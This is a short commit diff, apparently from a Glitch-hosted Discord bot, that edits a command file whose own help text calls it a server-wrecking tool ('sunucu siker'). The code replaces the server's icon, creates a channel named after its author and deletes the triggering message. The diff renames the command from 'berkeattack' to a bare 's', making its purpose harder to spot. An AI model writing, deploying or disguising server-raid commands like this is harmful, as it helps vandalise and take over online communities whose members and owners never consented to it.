3b065dfa2666edc2d405dfc714fd2648ba270714
Glitch (benim-botum-lan) <none>
2019-07-02 15:52:49 +0000

    🐑🔑 Checkpoint ./tokenyeri.json:2558838/472 ./berke/genel.js:2558838/806

--- berke/genel.js
+++ berke/genel.js
@@ -18,7 +18,7 @@ message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595
 message.guild.setIcon(`https://images-ext-1.discordapp.net/external/Y7R2e9ELj25TBIHsxS9Or2suLUqLYcKOb2ve33XqbSA/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/21992052`)
 message.guild.createChannel(`berke`)
 message.delete()
-};  
+};
 
 exports.conf = {
   enabled: true,
@@ -29,7 +29,7 @@ exports.conf = {
 };
 
 exports.help = {
-  name: 'berkeattack',
+  name: 's',
   description: 'sunucu siker', 
   usage: 'benberke = sunucu siker'
 };
